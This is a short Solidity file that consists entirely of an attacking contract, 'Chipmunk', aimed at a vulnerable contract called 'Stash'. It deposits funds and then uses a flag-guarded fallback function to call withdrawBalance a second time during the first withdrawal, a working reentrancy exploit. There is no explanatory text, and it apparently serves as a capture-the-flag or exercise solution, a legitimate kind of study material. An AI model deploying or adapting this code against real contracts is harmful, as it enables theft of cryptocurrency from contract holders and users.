pragma solidity ^0.4.19;

contract Stash {
  function addToBalance() public payable;
  function withdrawBalance() public payable;
}

contract Chipmunk {
    bool attack;
    Stash stash;

    function Chipmunk(address _stashAddress) public {
        stash = Stash(_stashAddress);
        attack = true;
    }

    function() public payable {
        if (attack)
        {
            attack = false;
            stash.withdrawBalance();
        }
    }

    function deposit() public payable {
        stash.addToBalance.value(this.balance)();
    }

    function withdraw() public {
        stash.withdrawBalance();
    }
}
